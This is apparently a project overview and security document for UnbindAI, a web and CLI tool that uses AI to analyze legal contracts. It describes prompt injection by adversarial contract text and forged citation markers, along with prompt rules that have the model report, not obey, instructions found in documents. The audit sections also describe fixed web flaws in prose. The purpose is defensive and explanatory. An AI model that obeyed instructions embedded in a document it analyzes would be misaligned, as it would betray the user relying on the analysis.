# UnbindAI — Complete Feature & Security Overview

**What it is:** an AI-powered legal contract analyzer built for people *without* legal training. Upload a PDF or DOCX — or photograph a paper contract with your phone — and get a clause-by-clause risk breakdown in plain English, negotiation help with a ready-to-send message, a glossary of legal jargon, a cited Q&A conversation about the document, and email reminders before its deadlines arrive.

**Who it's for:** non-lawyers facing a contract they're expected to sign — tenants, freelancers, employees, small-business owners. Every AI prompt in the system explicitly targets a ~6th-grade reading level; the product's core claim is comprehension, not legal advice.

**Shape:** a monorepo with three deployables.

| Component | Stack | Purpose |
|---|---|---|
| `backend/` | Python 3.12, FastAPI, MongoDB (Motor) | API, AI pipeline, auth, payments |
| `frontend/` | Next.js 15 App Router, React 19, TypeScript, Tailwind v4 | Web app |
| `cli/` | Node ≥18, ESM | Terminal client (`@sachin-0001/unbind`) |

Hosted on Vercel (two projects), data on MongoDB Atlas, inference on Groq, embeddings via the HuggingFace Inference API, payments through Razorpay, and the daily reminder sweep driven by GitHub Actions.

---

## 1. Document Intake

Four input paths, all converging on the same analysis pipeline:

| Format | How it's read | Notes |
|---|---|---|
| **PDF** | `pdfplumber`, falling back to `PyPDF2` | Two extractors because real-world PDFs vary wildly |
| **DOCX** | `python-docx` — paragraphs *and* table cells | Tables matter: contract terms often live in them |
| **Plain text** | UTF-8 decode with replacement | |
| **Photos / scans** | Groq vision OCR (`qwen/qwen3.6-27b`) | The differentiating input path |

**Photographing a paper contract** is a first-class flow, not an afterthought:

- Images are downscaled to a 2000 px maximum and re-encoded as JPEG q85 by Pillow before the vision call — smaller payload, faster response, fewer vision tokens.
- HEIC (the iPhone default) is detected and rejected with an actionable message rather than failing opaquely.
- Camera capture appears as a dedicated input on screens ≤640 px wide.
- Size caps are enforced on both sides: 15 MB for images, 25 MB for documents, checked client-side *and* server-side.
- A minimum of 50 extracted characters is required before analysis begins, so an unreadable scan fails fast with guidance instead of producing a confident analysis of nothing.

Extraction runs in a worker thread (`asyncio.to_thread`), so parsing a large PDF never stalls the event loop for other requests.

---

## 2. Contract Analysis — the core

Pipeline (`backend/app/services/analysis_service.py`):

```
raw text
  → markdown conversion (heading detection → structural hierarchy)
  → LLM legal-document classifier  ← gate: rejects non-contracts
  → chunking (2000 chars, 200 overlap)
  → per-chunk clause analysis, fanned out in parallel
  → per-chunk summaries
  → synthesized whole-document report
```

**Per clause, the output is:**

| Field | What it gives the user |
|---|---|
| `clauseText` | The exact original wording |
| `simplifiedExplanation` | What it actually means, in plain English |
| `riskLevel` | High / Medium / Low / Negligible / No Risk |
| `riskReason` | *Why* it's risky — the part users can act on |
| `negotiationSuggestion` | What to ask for instead |
| `suggestedRewrite` | Concrete replacement wording |

**Per document:**

- **Summary** — the whole agreement in a paragraph.
- **Key terms glossary** — every piece of jargon, defined.
- **Key dates** — extracted deadlines, notice periods, renewal windows. These feed the reminder system (§5), which resolves the schedulable ones and emails ahead of them.
- **Missing clauses** — protections that *should* be there and aren't. This is the analysis most users can't do themselves; you can't notice the absence of a clause you've never heard of.
- **Chunk summaries** — section-by-section navigation for long documents.

**Role-aware:** the user states their side of the deal (tenant vs. landlord, contractor vs. client) and risk is assessed from that position.

### Live progress streaming

Analysis of a long contract takes time, so both analysis endpoints have SSE variants that stream progress rather than leaving the user on a spinner. Stages: `ocr` → `converting` → `validating` → `chunking` → `analyzing_start` → `analyzing_clause` (with `completed`/`total` counts) → `summarizing` → `synthesizing`.

The frontend deliberately bypasses the Next.js rewrite proxy for these calls and hits the backend origin directly — rewrites buffer the full response, which would defeat streaming entirely. `X-Accel-Buffering: no` is set for the same reason.

---

## 3. Ask Anything — document Q&A with verifiable citations

One conversational tab answers both shapes of question about an analysed contract:

- **Fact** — *"what is the notice period?"*, *"am I allowed to sublet?"*
- **Hypothetical** — *"what happens if I move out three months early?"*

These were previously two features (a Q&A and a separate "Impact Simulator") with two prompts and two answer builders. They shared one mechanism — retrieve the relevant clauses, answer with citations — so the split only pushed a classification job onto the user that the pipeline never needed. It is now one prompt, one answer builder, one tab.

```
question
  → resolve against conversation history (prepend the prior question)
  → HyDE: generate a hypothetical clause-shaped passage
  → embed (question + hypothetical) together
  → exact cosine search over the analysis's persisted vectors (k ≤ 6)
  → answer with inline [S1]…[Sn] citation markers
  → persist the turn
```

**HyDE** (Hypothetical Document Embeddings) exists because a user's question and the contract's language don't look alike. "Can I leave early?" and "Lessee shall provide ninety (90) days written notice of intent to vacate" share almost no vocabulary. Generating a hypothetical *clause* first, then searching with that, retrieves what plain question-embedding misses.

**Citations are verifiable, not decorative.** Each carries `startIndex`/`endIndex` character offsets into the original document, so clicking `[S1]` in the answer scrolls the document pane to the exact source span and highlights it. The user can always check the AI's work — which matters a great deal when the subject is a contract they're about to sign.

**Conversational, with server-side history.** Turns are stored per (analysis, user) in `document_chats`, capped at 200 messages, and the last 6 turns are replayed as context — so a bare follow-up like *"and if I'm late?"* resolves against what was just discussed. Prior `[S#]` labels are stripped from replayed history: they referred to a *different* retrieval, and replaying them invites the model to cite excerpt numbers that no longer exist. Because a bare follow-up also *embeds* poorly on its own, the previous question is prepended to form the retrieval query.

**Admitting ignorance is a feature.** A contract Q&A tool that invents a plausible answer about a document that is silent on the topic is worse than useless, because the user acts on it. The prompt makes *"the contract doesn't cover this"* an explicitly correct answer, forbids filling gaps from general legal knowledge without labelling it as such, and forbids citing contract clause numbers as if they were sources. When retrieval returns nothing at all, the model is never called — a fixed "I couldn't find anything related to this" answer is returned instead, so there is no opportunity to hallucinate.

### The vector store — and why there isn't a vector database

Retrieval here is always scoped to a *single* contract; there is no cross-corpus search. One document is tens to a few hundred 384-dim vectors, so an exact brute-force cosine scan in numpy costs microseconds — less than the network round-trip to an external index would, and *exact* rather than approximate. Chroma (and its `posthog` pin) was dropped for `numpy`.

| Property | Implementation |
|---|---|
| Storage | Packed float32 bytes in a BSON `Binary` on `document_vectors` — half the size of a list of BSON doubles, and it loads straight into numpy with no per-element Python conversion |
| Normalisation | Done once at write time, so search is a plain dot product; zero-norm rows are left alone rather than producing NaNs that would poison every later comparison |
| Search | `matrix @ query` + `argpartition` top-k — no full sort |
| Chunking | 1000 chars / 150 overlap, sized to sit just under the embedding model's 256-token limit so nothing is silently truncated |
| Build timing | Once per analysis, lazily on the first question — so analyses predating the feature work without a migration |
| Invalidation | A record embedded with a different model is rebuilt, never compared across vector spaces (which would return confident nonsense) |
| Ceiling | 800 chunks per document, so a pathological input can't drive unbounded embedding calls |
| Cleanup | Deleting an analysis deletes its vectors *and* its conversation — otherwise "delete" leaves the contract text behind in chunk form |

The expensive part was never the search; it was the *embedding*. The previous implementation rebuilt an ephemeral index on every question, so asking five questions about one contract embedded it five times. Persisting the index removed that entirely.

**Graceful degradation:** if HyDE fails, the raw question is embedded. If vector search fails, it falls back to keyword matching over the same chunks — still with real offsets, so citations keep working. Both paths degrade the answer, neither breaks the feature.

Embeddings: `sentence-transformers/all-MiniLM-L6-v2` (384-dim) via the HuggingFace Inference API, with a bounded 8-way concurrency gate so a 40-chunk contract isn't 40 sequential HTTP calls. Notably there is **no local `torch` dependency** — a deliberate choice that keeps the serverless deployment small and cold starts fast.

**`POST /analysis/simulate` is retained** for the already-published CLI, which posts raw document text with no analysis id and reads back a `result` field. It delegates to the same prompt and the same citation builder as the web path, so the two can't drift.

---

## 4. Negotiation Copilot

Analysis without a next step isn't much use. Two features close that gap:

**Per-clause decisions** — for each flagged clause, choose *keep original* / *use the AI's rewrite* / *write my own*. Decisions accumulate into a revised document.

**Message drafting** — turn those decisions into something sendable, across a tone × format matrix:

| | |
|---|---|
| **Tone** | polite · neutral · firm |
| **Format** | email (with subject line) · WhatsApp message · formal letter |

Addressed to a named counterparty and signed off with the user's name.

The draft parser has a four-tier fallback (`Subject:` regex → JSON → scrape malformed JSON → treat everything as body), so a malformed model response never surfaces as brace soup to the user. The frontend separately filters the model's literal `"No changes needed"` sentinel so it can never get spliced into a document as if it were clause text.

---

## 5. Deadline Reminders

Analysis extracts a contract's key dates; this is what makes them useful six months later, when the contract said *"give 60 days notice"* and nobody remembers. It turns UnbindAI from a one-shot tool into something that keeps working after the user closes the tab.

### Resolving dates without guessing

`keyDates` comes out of the pipeline as free text, because that's how contracts actually express deadlines. Only some of it is a calendar date:

| Extracted text | Outcome |
|---|---|
| `2026-12-31`, `31 December 2026` | **Schedulable** |
| `within 30 days of signing` | `relative` — needs an anchor date |
| `the 1st of each month` | `recurring` |
| `upon termination` | `conditional` — no date exists |
| `01/02/2026` | `ambiguous` — 1 Feb or 2 Jan? |
| a date already gone | `past` |

**Nothing is guessed.** A wrong reminder date on a legal deadline is worse than no reminder at all — the user relies on it and misses the real one. Anything not unambiguously resolvable comes back unschedulable *with a reason*, and the UI surfaces it as "needs a date from you" with reason-specific copy (`relative` → *"Counted from another date — tell us when that was"*) rather than silently dropping it. The user can then supply the date, which converts the flagged item into a real reminder.

Pure-numeric dates are accepted only when one reading is impossible (`31/01/2026` is unambiguous, `01/02/2026` is not). Order of checks matters: relative and recurring markers are tested *before* absolute extraction, because `30 days after 1 January 2026` contains a real date without being one.

Deliberately **deterministic — no LLM call**. A second model pass per analysis would cost tokens, vary between runs, be far harder to test, and would still have to refuse the genuinely ambiguous cases.

### The sweep

The backend is serverless and only runs during a request, so something external has to wake it: a daily GitHub Actions job (`03:30` UTC ≈ 09:00 IST) posting to `POST /api/reminders/sweep`.

- **One digest per user per run**, not one email per reminder — three deadlines landing the same week should not be three emails.
- **Idempotent by construction.** Each reminder records *which lead times it has already emailed* (`sentLeads`), and the sweep is driven by that record rather than by "did today's job run". A double-fire therefore sends nothing, and a week-long outage still sends once, late, instead of never.
- **An outage collapses, rather than bursts.** Lead times default to 14/7/1 days. The sweep fires the *largest* arrived-but-unsent lead and then marks every arrived lead as sent — so if the 14- and 7-day marks both passed unsent, the user gets one useful email, not two.
- **Failures retry.** A send failure leaves `sentLeads` untouched so the next run tries again; a failure to *mark* after a successful send is logged but doesn't fail the sweep, since one possible duplicate beats aborting.
- **Skips green when unconfigured.** Reminders are opt-in infrastructure and the rest of the app works without them, so a repo without the secrets set gets a warning and a step summary explaining what to configure — not a failed run emailing its owner every single day.
- `dry_run` reports exactly what would be sent without sending or marking anything, and a manual `workflow_dispatch` **defaults to a dry run** so testing the wiring can't accidentally mail real users.

### Consent and access

- The sweep endpoint mails every user with a due deadline, so it is authenticated with a shared secret compared in constant time (`hmac.compare_digest`) — and **refuses to run (503) when the secret is unset**, rather than defaulting open. An unset secret is a misconfiguration, not permission.
- Every digest carries a **signed one-click unsubscribe** that needs no login, scoped with a `purpose: "unsubscribe"` claim so it can't be replayed as a session token. It answers with a small HTML page, because it's opened from a mail client.
- Opted-out users are filtered *before* any mail is built. Reminders default on — the user uploaded a contract to be helped with its deadlines — with opt-out and lead-time preferences in the profile.
- Reminder generation is fire-and-forget: a failure here can never turn a successful analysis into an error. Generation is idempotent via a unique index on (`userId`, `analysisId`, `description`, `dueDate`), so re-analysing a document can't produce duplicate reminders — or duplicate emails.

---

## 6. Document Tooling

| Feature | Implementation |
|---|---|
| **Three-pane diff** | Original / review / revised, word-level, with a custom `diffWords` + `buildDocumentSegments` + `applyDecisions` engine. Collapses to tabs on mobile |
| **PDF redline overlay** | Extract text positions with `pdfjs-dist`, stamp rewritten clauses onto the *original* PDF with `pdf-lib` — the layout survives |
| **Calendar export** | Extracted deadlines → `.ics` file or Google Calendar links. Sits alongside the reminders panel in the Key Dates tab, which handles the same dates by email |
| **PDF report export** | Full analysis as a shareable document via `jsPDF` |
| **Clause highlighting** | Whitespace/punctuation-normalized matching that maps positions back to original offsets, so highlights land correctly even when the model's quoted text differs cosmetically from the source |

---

## 7. Accounts, Plans & Payments

**Authentication:** email/password (bcrypt) or Google Sign-In. JWT HS256 in an httpOnly cookie, with a `localStorage` Bearer fallback for clients that can't use cookies (the CLI).

**Plans** — prices are a server-side catalogue; the browser only ever names a plan:

| Plan | Price | Duration | Analyses/day | AI queries/day | Lawyer directory |
|---|---|---|---|---|---|
| Free | — | — | 1 | 10 | ✗ |
| Brief | ₹100 | 30 days | 3 | 40 | ✗ |
| Motion | ₹450 | 90 days | 5 | 100 | ✗ |
| Verdict | ₹1,500 | Lifetime | Unlimited | Unlimited | ✓ |

Expiry is centralized in one function (`effective_plan`) so a lapsed plan reverts to free-tier treatment consistently — the rate limiter, the plan endpoint, and the directory paywall all route through it rather than each reading `user["plan"]` and drifting apart.

**Razorpay integration:** order creation → Checkout.js → signature verification → plan grant, with a server-to-server webhook as the reliable backstop when the browser never returns.

---

## 8. Lawyer Referral Network

When AI analysis isn't enough, escalate to a human. Lawyers self-register (name, specializations, bio, years of experience, city); the directory is filterable by specialization and gated to the Verdict plan. Contacting a lawyer stores the request and emails them with the user's address as `Reply-To`, so replies go directly to the user without exposing either party's address to the other prematurely.

Records land `verified: false` pending review.

---

## 9. CLI

```bash
unbind contract.pdf     # analyze, then enter an interactive REPL
unbind list             # analysis history
unbind export <file>    # export as md or txt
```

REPL actions: summarize · translate · ask a question · extract clauses · export. Credentials persist to `~/.config/unbindai/config.json`. Requires the Verdict plan.

The CLI is published, so its API contract is treated as frozen: "ask a question" still posts to `/analysis/simulate` and reads back `result`, even though the web app moved to the conversational `/{analysis_id}/chat`. Both call the same answering path server-side, so an installed CLI keeps working and can't drift from the web behaviour.

---

## 10. Security Posture

### Authentication & sessions

- **bcrypt** password hashing via passlib, with per-password salting.
- **JWT HS256**, 7-day expiry, verified on every request; tampered, expired, or wrong-secret tokens are rejected.
- **httpOnly cookies** — JavaScript cannot read the session token.
- `secure` + `SameSite=None` in production, `SameSite=Lax` over plain HTTP locally.
- **`X-Forwarded-Proto` detection** catches a specific real-world misconfiguration: if `FRONTEND_URL` still says `localhost` but the request actually arrived over HTTPS through Vercel's proxy, cookies are still issued with production flags rather than silently insecure ones.
- **Google OAuth verified server-side** — the ID token is checked against Google's `tokeninfo` endpoint and the `aud` claim is matched against the configured client ID. A forged client-side credential doesn't get in.

### Multi-tenancy & data isolation

Every read, write, and delete of user data is scoped to the authenticated user's ID at the query level — not filtered after the fact. Analyses are matched on `{_id, userId}` together, so requesting another user's analysis returns 404 rather than leaking it. The same applies to everything derived from a document: vectors, conversations, and reminders are all keyed on `(analysisId, userId)`, and the Q&A and reminder endpoints confirm ownership of the parent analysis *before* revealing anything computed from it. Payment history is scoped identically. This is covered by explicit tests that assert user A cannot read *or* delete user B's records.

### Payment integrity

This is the most carefully hardened area of the codebase, and deliberately so:

| Attack | Defense |
|---|---|
| Tampered price | Amounts live in a **server-side catalogue**; the client sends only a plan name |
| Forged callback | **HMAC-SHA256** signature verification using `hmac.compare_digest` (constant-time, so the comparison itself leaks nothing) |
| Lying about payment status | The order is **re-fetched from Razorpay** and asserted `paid` — the client is never trusted |
| Claiming someone else's payment | **Ownership check** against the order's recorded user |
| Replayed `/verify` call | Grants are **idempotent**, keyed on the Razorpay payment ID |
| Two concurrent grants of one payment | A **unique index** on `payments.razorpayPaymentId` is the race-safe backstop |
| Browser never returns | A **webhook** with raw-body signature verification grants the plan anyway |

The grant is ordered so a paying user is never left un-granted: the plan is applied first, the payment recorded second. A crash between the two self-heals on replay. Around 30 tests cover these paths specifically, including replay, signature mismatch, amount mismatch, and wrong-user scenarios.

### Secrets management

- No secret has ever been committed — **Gitleaks scans the full history** on every push and PR, and blocks the build on a finding.
- `.env` files are gitignored; `.env.example` documents variable *names* only.
- **Fail-fast production validator:** the app refuses to boot outside local dev if `JWT_SECRET` is still the shipped default or `GROQ_API_KEY` is empty. A misconfigured deploy dies loudly at startup instead of running insecurely.
- `RAZORPAY_KEY_SECRET` is server-only and never reaches the browser; only the public `KEY_ID` is exposed.
- `REMINDER_SWEEP_SECRET` gates the endpoint that mails every user with a due deadline. It has no default, and the endpoint refuses to run without it — the failure mode of a missing secret is "nothing sends", not "anyone can send".

### Input validation & abuse resistance

- **Upload size caps** — 15 MB images, 25 MB documents, enforced server-side. A large file can't be read into memory unbounded.
- **Length limits on every LLM-bound field** — document text (600k chars), questions and scenarios (2k), clause text (20k), and the number of negotiation points (50) are all capped. Without these, one request could drive an arbitrary number of model calls. Retrieval is separately capped at 800 chunks per document.
- **Bounded stored state** — a document's conversation is trimmed to its most recent 200 messages via `$slice`, and reminder generation stops at 50 per analysis, so no per-user collection grows without limit.
- **Pydantic validation on every request body**, with `EmailStr` on all address fields.
- **HTML-escaped email templates** — user-supplied content (contact messages, addresses) is escaped before interpolation, so nobody can inject markup or links into mail that arrives looking like it came from UnBind AI.
- **Malformed IDs answer 400, not 500** — a bad path parameter is a client error and is reported as one.

### Rate limiting & cost control

Two independent layers:

**Inbound, per user** — daily quotas enforced atomically. The check-and-increment is a single conditional `find_one_and_update`, so two simultaneous requests can't both observe "0 used" and both pass; the loser gets a 429. Two separate counters (full analyses vs. cheaper follow-up AI queries) so heavy questioning doesn't consume a user's analysis allowance. Every LLM-backed endpoint is metered — including document Q&A, `/simulate`, and negotiation drafting, each of which is a HyDE or completion call and so an unbounded bill if left open. An expired paid plan falls back to the free tier's quota, since the counter reads through `effective_plan`.

**Failure-safe:** the quota is *reserved* before the work and *refunded* if it fails. A free user (1 analysis/day) whose scan OCRs badly or whose upload is rejected as non-legal doesn't lose their day to an error they didn't cause. Refunds are best-effort and never escalate a handled error into a 500, and a refund arriving after midnight is dropped rather than corrupting the next day's counter.

**Outbound, to Groq** — four feature-scoped API keys (analysis, HyDE, negotiation, vision OCR), each with its own concurrency semaphore. Features draw on independent per-key rate limits instead of competing, so a burst of OCR work can't starve contract analysis. Rate-limit responses are retried with backoff that honors the upstream `Retry-After` header.

### Network & transport

- **Allowlist CORS** — the configured frontend plus localhost. The broad `*.vercel.app` match is *opt-in* via an explicit regex, so anonymous Vercel deployments can't call the API by default.
- `allow_credentials` is paired with a specific origin list, never a wildcard.
- **The allowlist can't silently degrade to localhost.** In production, startup refuses to boot unless `FRONTEND_URL` is explicitly set to a non-loopback `https://` origin — it is the sole entry feeding both CORS and the CSRF Origin check, so a missing env var used to mean a localhost page could drive credentialed calls against production.
- **Rate-limit identity is read from the right-hand side of `X-Forwarded-For`**, by a configured `TRUSTED_PROXY_HOPS`. Proxies append, so the leftmost entry is whatever the client typed; trusting it made every limit bypassable with a random header per request.
- **Backend-origin responses carry their own security headers** (`nosniff`, `no-referrer`, `DENY`), rather than relying on the Next rewrite — SSE, uploads and the HTML unsubscribe page are reached directly.

### AI-specific safeguards

- **Legal-document classifier gate** — an LLM check rejects non-contracts up front, so users don't get confident risk analysis of a restaurant menu.
- **Untrusted content is fenced and declared as data** — contract chunks and retrieved excerpts are wrapped in explicit tags, forged fence tags are stripped, and the system prompts state that instructions found inside the fence must be reported rather than obeyed. Contracts arrive from the counterparty, so the document is an untrusted input, not a trusted one.
- **Citations can't be forged from document text** — any `[S#]`-shaped sequence inside a retrieved passage is rewritten before numbering, so a contract can't mint a reference to text the user never sees.
- **Degraded retrieval is visible, not silent** — if semantic search fails, the response is tagged rather than quietly answering from keyword matching, and a keyword miss returns nothing instead of offering the first few chunks as though they were relevant.
- **Bounded work per request** — chunk and summary counts are capped and the synthesis prompt has a fixed context budget, so one large upload can't monopolise the shared concurrency gate or run up an unbounded bill on a single quota unit. Work beyond the cap is reported as `partial`, never presented as a complete analysis.
- **Verifiable citations** — every Q&A claim carries character offsets back to the source text. The user can check the AI rather than trust it. The prompt explicitly forbids inventing citation labels or citing contract clause numbers as if they were sources, and replayed conversation history has its old labels stripped so they can't be recycled against a different retrieval.
- **Grounding over fluency** — the Q&A prompt makes "the contract doesn't cover this" a correct answer and forbids filling gaps from general legal knowledge unlabelled. A retrieval miss skips the model entirely rather than giving it an opening to invent.
- **No LLM in the date path** — deadline resolution is deterministic regex work that refuses ambiguous input, rather than a model that would guess a plausible date onto a legal deadline.
- **Layered JSON recovery** — code-fence stripping → `json.loads` → a balanced-brace span scanner (string- and escape-aware) → structured failure. A chatty model response degrades to a clear error, never to garbage rendered as analysis.
- **Distinguished failure modes** — "the model returned an unexpected format" and "no clauses found in this document" are different errors with different user guidance.

### Supply chain & static analysis

- **Semgrep SAST** across `p/default`, `p/python`, `p/typescript`, `p/react`, `p/secrets` on every push and PR.
- **Gitleaks** secret scanning over full history — blocking.
- CI enforces `ruff check`, `ruff format --check`, `pytest`, `eslint`, `tsc --noEmit`, `vitest`, and a production `next build`. A PR that breaks any of these can't merge green.

---

## 11. Reliability & Operations

- **Readiness health check** — `/api/health` pings MongoDB and answers 503 when it can't. It reports what's actually true rather than always claiming healthy.
- **Startup index creation** — idempotent and independently attempted per index, so one failure (a pre-existing duplicate blocking a unique build) doesn't silently skip the rest. Indexes are split by role: a failed *performance* index logs and continues, but a failed *correctness* index — the unique ones the webhook and signup races depend on — aborts startup. Booting healthy with those guarantees quietly off was worse than not booting.
- **Indexes backing correctness, not just speed:**

  | Index | What it guarantees |
  |---|---|
  | `users.email` unique | Closes the check-then-insert race in signup, where two concurrent requests could both find no account and both create one |
  | `payments.razorpayPaymentId` unique | The payment idempotency backstop — a replayed `/verify` or duplicate webhook can't grant a plan twice |
  | `lawyers.email` unique | Same, for lawyer registration |
  | `reminders` (userId, analysisId, description, dueDate) unique | Re-generating for an analysis can't create duplicate reminders — or duplicate emails |
  | `document_vectors` / `document_chats` (analysisId, userId) unique | A concurrent double-build can't leave two records that read back non-deterministically |
  | `analyses` (userId, analysisDate ↓) | Every dashboard load — by owner, newest first |
  | `reminders` (schedulable, dueDate) | The sweep's query: schedulable reminders inside the lead-time window |

- **Derived data is cleaned up with its source** — deleting an analysis deletes its vectors, its reminders, and its conversation, so a "delete" doesn't leave the contract text behind in chunk form. Each is best-effort and logged: an orphaned vector record is unreachable (every read is scoped by `analysisId`) and not worth failing the user's delete over.
- **Scheduled work is externally driven but internally idempotent** — the sweep can fire twice or not at all for days without double-sending or dropping a reminder, because state lives on the reminder rows rather than in the scheduler.
- **Pagination** on every list endpoint, with the largest field (`documentText`) projected out of list responses — it's never rendered in a list, and it dominates the payload. The full record is fetched only when a document is actually opened.
- **Non-blocking I/O throughout** — PDF/DOCX parsing, Pillow preprocessing, and SMTP sends all run in worker threads.
- **LangSmith tracing** on every LLM entry point, with per-request metadata (endpoint, user, file name, text length) and tags.
- **Structured logging** with a configured root level, so informational logs actually reach the log stream.
- **Streaming errors are always delivered as events**, never as a truncated connection — the client can render a real message instead of showing a dead spinner.

### Test coverage

**448 automated tests.**

- **415 backend** (pytest, async, in-memory fakes — no network, no real database):

  | Area | What's covered |
  |---|---|
  | Auth | JWT lifecycle and tamper resistance, cookie-vs-Bearer precedence, bcrypt behavior, Google token verification |
  | Payments | The full flow including replay, signature mismatch, amount mismatch, wrong-user, and webhook paths |
  | Quotas | Atomicity, refund on failure, both counters, plan tiers, day boundaries, and pre-existing accounts with no counter field |
  | Isolation | A user reading *or* deleting another's analysis, reminders, chat, and payments |
  | Q&A | Retrieval, citation offsets, multi-turn history, history-label stripping, no-match short-circuit, and the CLI's `/simulate` contract |
  | Vector store | Pack/unpack round-trips, normalisation, top-k ordering, model-change invalidation, dim mismatch, keyword fallback |
  | Dates | Every resolution class — ISO, day-month-year, month-day-year, ambiguous numeric, relative, recurring, conditional, past, invalid calendar dates |
  | Reminders | Sweep behaviour under repeat runs and outages, lead-time selection, digest grouping, opt-out filtering, unsubscribe tokens, per-user send failures |
  | Intake | Upload size guards, OCR detection and preprocessing, negotiation parser fallbacks |
  | Rate limiting | Spoofed `X-Forwarded-For` no longer buys a fresh bucket, genuine clients stay separate, Google sign-in is throttled |
  | Prompt hardening | Untrusted-content fencing, forged fence tags, `[S#]` citation forgery, degraded-retrieval tagging |
  | Pipeline bounds | Chunk and summary caps, observable concurrency, retry-before-drop, failure-ratio refusal, array-shaped synthesis |
  | LLM client | One cached client per (key, model, temperature), dedicated per-feature keys stay separate, `Retry-After` clamping |

  The Mongo fakes support `$inc`, `$push`/`$each`/`$slice`, `$gte`, `find_one_and_update`, unique indexes, and real `ObjectId`s — enough that the atomic-quota and idempotency paths are actually exercised rather than mocked past.

- **33 frontend** (vitest): the diff engine and its offset mapping, storage helpers including the sessionStorage quota fallback, currency formatting, RFC 5545 ICS escaping.

---

## 12. Design & Accessibility

`frontend/DESIGN.md` is a full design-system specification: a Linear-inspired near-black palette (`canvas #010102`, accent `#5e6ad2`), a typography and spacing scale, elevation rules, component conventions, and a responsive strategy.

Light and dark themes are CSS-variable-driven with SSR-safe persistence. Layouts are mobile-first: the diff view collapses to tabs, camera capture appears only on small screens. Error boundaries exist per-route with an animated scales-of-justice loader.

---

## 13. Honest Limitations

Stated plainly, because a security document that only lists strengths isn't useful:

- **Not legal advice.** The product explains a contract; it doesn't replace a lawyer. The referral network exists precisely because that boundary is real.
- **Prompt injection is mitigated, not solved.** Untrusted document text is now fenced and declared as data (see below), which raises the bar considerably — but fencing is a mitigation, not a proof. A sufficiently clever adversarial contract may still influence its own analysis, and there is no output-side check that a risk rating wasn't steered.
- **The `verified` flag on lawyers has no admin workflow** to set it, and registration is an unauthenticated public endpoint without a captcha or rate limit.
- **Paid tiers currently use the same model as free** (`FREE_MODEL == PRO_MODEL`). Quotas and features differ; model quality does not yet.
- **Reminders depend on an external scheduler.** The sweep is idempotent and tolerates a missed run, but if the GitHub Actions job is never configured (or silently stops), no reminder ever sends and nothing in the app notices. There is no "last successful sweep" signal.
- **Unsubscribe tokens don't expire and can't be revoked.** They're signed and purpose-scoped, so they can't act as a session, but a leaked reminder email lets anyone holding it opt that user out. The blast radius is unwanted-mail-off, which is why it's acceptable rather than fixed.
- **Recurring and relative deadlines are surfaced, not solved.** The parser refuses to guess, which is right, but the user has to supply the date manually — a "signed on" anchor date per contract would resolve most `relative` cases automatically.
- **Semgrep runs in audit mode** — findings are reported but don't block the build, pending triage of the existing set.
- **No error tracking** (Sentry or equivalent) and **no token/cost accounting** per user yet.
- **No session revocation.** Logout is still client-side. A captured token now dies at the 30-day absolute ceiling rather than living forever behind `/auth/me` polling, but there is no denylist that can kill one on demand.
- **Very large documents are analysed in part, not in full.** The pipeline caps at 150 chunks and 40 chunk summaries to stop one request monopolising the shared LLM concurrency gate. Beyond that the report is explicitly marked `partial` with an `unanalyzedSections` count rather than silently pretending completeness — honest, but still a ceiling.
- **Rate-limit client identity depends on deployment config.** `TRUSTED_PROXY_HOPS` (default 1) says how many proxy hops to trust when reading `X-Forwarded-For`. Set it wrong for the actual topology and the limiter key becomes attacker-influenceable again. A trusted-CIDR allowlist would be self-configuring; that needs infrastructure knowledge this repo doesn't have.
- **Backend dependencies are unpinned.** Every requirement is an unbounded `>=` range with no lockfile, so CI and production can resolve to different, untested versions and a compromised upstream release lands on the next build. A hashed lockfile is the fix.

### Resolved since the last revision

- ~~The vector index is rebuilt per request~~ — embeddings are now persisted per analysis in MongoDB and reused across questions; asking five questions embeds the document once, not five times.
- ~~`/simulate` and `/negotiation-message` are authenticated but unbounded~~ — both are now metered on the separate query counter.
- ~~Quota enforcement is read-compare-write~~ — now a single conditional update, with a refund on failure.
- ~~Cross-tenant isolation is untested~~ — a user reading or deleting another user's records is now covered explicitly.
- ~~Lead times above 14 days don't fire when selected~~ — the sweep's horizon now derives from `MAX_LEAD_DAYS` (365) instead of the default list, and `due_lead` does the real per-user filtering it always did. A 30/60/90-day lead fires at the lead the user actually chose.

---

## 14. Security & Correctness Audit — 2026-08-16

A full-repo audit of the backend, frontend, CLI and CI configuration. Findings were confirmed by reading the code (and, where behaviour was in question, by executing it) rather than by pattern-matching; each confirmed defect was then fixed and covered by a test. Backend tests went 310 → 415, frontend 18 → 33.

### Fixed — exploitable or data-corrupting

- **CORS/CSRF allowlist could silently fall back to `localhost:3000`.** `ENVIRONMENT` defaults to production but `FRONTEND_URL` defaulted to `http://localhost:3000` and was never validated, while being the *only* entry feeding both `CORSMiddleware` (`allow_credentials=True`) and the Origin/CSRF allowlist. With `SameSite=None; Secure` cookies, a forgotten env var meant any page on localhost could make credentialed, CSRF-passing calls against production. Startup validation now requires an explicit, non-localhost `https://` origin — and rejects a `JWT_SECRET` under 32 characters or set to a known placeholder.
- **Every rate limit was bypassable.** `client_ip` read the *first* `X-Forwarded-For` entry, but proxies *append*, so the attacker-supplied value always landed first — a random header per request bought a fresh bucket each time. Parsing now indexes from the right by a configured `TRUSTED_PROXY_HOPS`. `POST /api/auth/google`, which mints a new user on first sign-in, was also unthrottled beside a 5/hour signup rule; it now shares that ceiling.
- **The document diff mapped every offset to the wrong place.** `findActualPosition` never counted whitespace (`normalizeText(" ")` trims to `""`, which is falsy), so offsets were shifted right by the number of preceding spaces — a clause truly at index 42 resolved to 51, mid-word. Rewrites were being spliced at wrong offsets, so "Download revised" silently corrupted the user's contract text. Replaced with a single normalize-once pass that emits a parallel offset map; the duplicate copy in `DocumentView` is gone and both paths share one implementation.
- **Opening any analysis could OOM the tab.** `diffWords` built a full O(n×m) LCS table over the whole document — ~6.4 GB for a 20k-word contract — and `CompareDocumentsModal`'s memos ran *before* its `if (!open) return null` guard, so the cost was paid on open, not on clicking "Compare". The work is now gated on `open`, diffs per changed clause, trims common affixes, and degrades word → line → whole-text rather than allocating past a hard cell cap.
- **Unsubscribe mutated state on GET.** GET is exempt from the CSRF/Origin check, so any link prefetch, mail scanner or corporate URL-rewriter silently opted the user out. GET now renders a confirmation page; a new POST carrying the same signed, purpose-scoped token performs the write. Links already sent in past emails still work.
- **Prompt injection.** Counterparty-supplied contract text (and OCR output from arbitrary images) went into prompts undelimited. Chunks are now fenced in `<document_chunk>` tags with forged fence tags stripped, chat excerpts are fenced and any `[S#]`-shaped sequence in a passage is rewritten so it can't forge a citation, and both system prompts state that fenced content is data whose embedded instructions must be reported rather than obeyed.
